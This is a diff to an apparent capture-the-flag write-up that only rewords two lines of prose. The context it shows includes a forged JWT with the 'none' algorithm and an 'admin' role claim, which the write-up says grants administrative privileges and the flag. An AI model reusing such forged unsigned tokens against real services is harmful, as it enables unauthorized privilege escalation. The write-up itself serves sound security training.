@@ -33,8 +33,6 @@ Upon Base64 encoding, the manipulated token yields:
 ```
 eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjoxNzA5OTA1MDU0OTg1LCJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMjIuMC42MjYxLjk1IFNhZmFyaS81MzcuMzYiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDk5MDUwNTV9.
 ```
-This manipulated token successfully grants us administrative privileges, as illustrated by the obtained flag:
-
-And we get our flag:
+This manipulated token successfully grants us administrative privileges and we get our flag:
 
 ![grafik](https://github.com/6v4tq8mhlO23a/WriteUp/assets/76184566/bfd699e1-b43e-481f-86ad-bde0ca0723ab)
